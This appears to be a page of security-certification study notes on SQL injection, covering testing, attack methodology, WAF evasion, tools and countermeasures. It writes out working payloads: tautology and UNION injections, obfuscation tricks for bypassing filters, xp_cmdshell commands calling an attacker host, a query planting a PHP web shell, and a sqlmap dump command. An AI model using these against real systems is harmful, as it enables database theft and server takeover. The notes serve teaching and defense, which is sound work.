# SQL injection overview

- Also known as ***SQLi***
- Injecting malicious SQL queries into the application.
- Allows attacker to
  - Gain unauthorized access to system e.g. logging in without credentials
  - Retrieve, modify or delete the information stored in the database
    - E.g. inserting new users, updating passwords
  - Execute code remotely
- Exploits improper input validation in web applications
- A [code injection](../13-web-applications/owasp-top-10-threats.md#code-injection) technique.
- 💡 Can test on admin panels e.g. to find using google dorks `inurl:adminlogin.aspx`,  `inurl:admin/index.php`, `inurl:adminlogin.aspx`
- 📝 Simple and quick way to test for SQL injection vulnerability is to insert a single quote (`'`)
  - You can add other SQL code after that once vulnerability is verified.

## SQL definition

- Structured Query Language
- Lets you access and manipulate databases
- SQL can be used to query both relational and non-relational databases
  - However SQL database usually means relational database.

## Testing SQL injection

### Black box testing

- Also known as ***blackbox testing*** or ***black-box testing***
- Source code is not known to the tester
- Detect places where input is not sanitized

#### Function testing

- Output is compared to expected results
- E.g. setting `?id=` query parameter to `1'` then to `1'/*` then to `'1' AND '1'='1` ..

#### Fuzz testing

- Also known as ***fuzzing*** testing
- 📝 Inputting invalid/unexpected or random data and observing the changes in the output
- Often automated
- Monitors for exceptions such as crashes, failing built-in code assertions, or potential memory leaks
- Tools: • [WSFuzzer](https://sourceforge.net/projects/wsfuzzer/) • [WebScarab](https://github.com/OWASP/OWASP-WebScarab) • [Burp Suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite) • [AppScan](https://www.hcltechsw.com/products/appscan)q  [Peach Fuzzer](https://www.peach.tech/products/peach-fuzzer/)

### White box testing

- Also known as **whitebox testing** or **white-box testing**.
- Analyzing application source code.
- **Static code analysis**
  - Detect on source code
- **Dynamic code analysis**
  - Analyze during execution of the code
- Tools include: • [Veracode](https://www.veracode.com/) • [RIPS](https://github.com/robocoder/rips-scanner) • [PVS Studio](https://www.viva64.com/en/pvs-studio/)

## SQL injection methodology

1. **Information gathering**
   - E.g. database structure, name, version, type..
   - Goal is to identify vulnerabilities for SQL injection.
   - Entry points in application tested to inject queries, e.g. invalidated input fields.
   - 💡 [Error messages](./sql-injection-types.md#error-based-sql-injection) can reveal information about the database type and version.
2. **SQL injection**
   - Attacks to extract information from database such as name, column names, and records.
   - Can also insert or update certain information in the database.
     - E.g. modifying password of an existing user or inserting himself as new user to gain access.
3. **Advanced SQL injection**
   - Goal is to compromise underlying OS and network
   - Techniques include
     - Interacting with file system
       - E.g. in MySQL: `LOAD_FILE()` to read and `OUTFILE()` to write
     - Collect network information
       - E.g. reverse DNS: `exec master..xp_cmdshell 'nslookup a.com MyIP'`
       - E.g. reverse pings: `'; exec master..xp_cmdshell 'ping 10.0.0.75' --`
     - Executing commands that call OS functions at runtime
       - E.g. in MySQL: `CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll'`
     - Creating [backdoor](../07-malware/malware-overview.md#backdoor) to use execute commands using a remote shell
       - E.g. `SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'`
     - Transfer database to attackers machine
       - E.g. by using [`OPENROWSET`](https://docs.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql)

## SQL evasion

- Obfuscating input strings to avoid signature-based detection systems
- Using [IP fragmentation](../03-scanning-networks/bypassing-ids-and-firewall.md#packet-fragmentation) with optionally trying different orders

### Obfuscation against signature detection

| Technique | Plain-text | Obfuscated text |
| --------- | ---------- | --------------- |
| In-line comment | `select * from users` | `s/**/ele/**/ct/**/*/**/from/**/users` |
| Char encoding | `e` | `char(101)` |
| String concatenation | `Hello` | `'Hel'+'lo'` |
| Obfuscated codes | `/?id==1+union+(select+1,2+from+test.users)` | `/?id=(1)union(((((((select(1),hex(hash)from(test.users))))))))` |
| Manipulating white spaces | `OR 1 = 1` | `'OR'1'='1'` |
| Hex encoding | `SELECT @@version = 31` | `SELECT @@version = 0x1F` |
| Sophisticated Matches | `OR 1 = 1` | `OR 'hi' = 'hi'` |
| URL Encoding | `select * from users` | `select%20%2A%20from%20users` |
| Case Variation | `select * from users`  | `SeLeCt * FrOM UsErs` |
| Null byte | `UNION SELECT..` | `%00' UNION SELECT..` |
| Declare Variables | `UNION Select Password` | `; declare @sqlvar nvarchar(70); set @myVAR = N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)` |

### OWASP categories

- [SQL injection bypassing WAF | OWASP](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)
- **Normalization**
  - Obfuscating with e.g. comments
  - E.g. WAF blocks `/?id=1+union+select+1,2,3/*`
    - Attacker injects: `/?id=1+un/**/ion+sel/**/ect+1,2,3--`
    - Request passes WAF, SQL becomes `SELECT * from table where id =1 union select 1,2,3--`
- **HTTP Parameter Pollution (HPP)**
  - Injects delimiting characters into query strings
  - E.g. WAF blocks `/?id=1+union+select+1,2,3/*`
    - Attacker injects: `/?id=1&id=+&id=union=&id=+select+&1,2,3`
    - Test e.g. [google.com/search?q=hello&q=world](https://www.google.com/search?q=hello&q=world)
- **HTTP Parameter Fragmentation (HPF)**
  - Exploits SQL is built using more than parameter in backend
    - `Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);`
  - E.g. WAF blocks `/?a=1+union+select+1,2/*`
    - Attacker injects: `/?a=1+union/*&b=*/select+1,2`
- **Blind SQL Injection**
  - Replacing WAF signatures with their synonyms
  - E.g. WAF blocks `/?id=1+OR+0x50=0x50`
    - Attacker injects `/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1) ))=74`
- **Signature bypass**
  - E.g. WAF blocks is `/?id=1+OR+1=1`
    - Attacker injects `/?id=1+OR+0x50=0x50`

## SQL injection tools

- **[`sqlmap`](http://sqlmap.org/)**
  - Automatic SQL injection and database takeover tool
  - Requires session that can be retrieved through e.g. running [Burp Suite](https://portswigger.net/burp) as proxy.
  - Run e.g. `sqlmap -u https://cloudarchitecture.io/?id=3&Submit=Submit --cookie 'PHPSESSID=63j6; security:low'`
    - Outputs e.g.
      - `GET parameter id appears to be MySQL >= 5.0.12 AND time-based blind injectable`
      - `GET parameter id is 'Generic UNION query (NULL) - 1 to 20 columns' injectable`
    - `--dbs` parameter gets database names e.g. `mysql, phpmyadmin...`
    - `-D <database-name> --tables` parameters lists tables from given tabase name..
    - `-T <table-name> --columns` gives column names
    - `-C <comma-separated-column-names> --dump` to get columns
  - Can also crack hashes (not as fast as `hashcat`)
- [jSQL Injection](https://github.com/ron190/jsql-injection)
- Older tools:
  - [SQL Power Injector](http://www.sqlpowerinjector.com/)
  - [The Mole](https://github.com/tiankonguse/themole)
  - [OWASP SQLiX](https://wiki.owasp.org/index.php/Category:OWASP_SQLiX_Project) tool
- Mobile tools
  - [sqlmapchik](https://github.com/muodov/sqlmapchik) for Android - GUI for sqlmap
  - [Andro Hackbar](https://andro-hackbar.en.aptoide.com/app) for Android
- See also [SQL injection detection tools](#sql-injection-detection-tools)

## SQL injection countermeasures

- **Weakness**: The database server runs OS commands
  - Run database with minimal rights
  - Disable OS commands like `xp_cmdshell` (for shell access)
    - Invoking `xp_cmdshell` spawns a Windows command shell with input string passed to it for execution
    - Providing local system level access to the server.
- **Weakness**: Using privileged account to connect to the database
  - Monitor DB traffic using an IDS
  - Apply least privilege rule for accounts/applications that access databases
- **Weakness**: Error message revealing important information
  - Suppress all error messages
  - Use custom error messages
- **Weakness**: No data validation at the server
  - Filter and sanitize all client data
  - Size and data type checks protects against buffer overruns
  - E.g.

    ```c#
      // Vulnerable code:
      var command = new SqlCommand("SELECT * FROM table WHERE name = " + login.Name, connection);
      // Safe code:
      var command = new SqlCommand("SELECT * FROM table WHERE name = @name ", connection);
      command.Parameters.Add("@name", SqlDbType.NVarChar, 20).Value = login.Name;
    ```

- **Weakness**: Implementing consistent coding standards
  - Server-side input validation, data access abstraction layer, custom error messages.
- **Weakness**: Firewalling the SQL Server
  - Allow only access from web server and administrators

### SQL injection detection tools

- **Commercial scanners**
  - 📝 [Burp Suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite)
  - [IBM Security AppScan](https://www.ibm.com/developerworks/library/se-scan/index.html)
  - [Acunetix Vulnerability Scanner](https://www.acunetix.com/vulnerability-scanner/)
- **Open source scanners**
  - [w3af](https://github.com/andresriancho/w3af)
  - [Wapiti](https://wapiti.sourceforge.io/)
  - [Zeus-Scanner](https://github.com/ekultek/zeus-scanner)
  - [RED HAWK](https://github.com/Tuhinshubhra/RED_HAWK)
- [Snort](./../11-firewalls-ids-and-honeypots/intrusion-detection-system-(ids)-overview.md#snort) - Open Intrusion Prevention System (IPS)
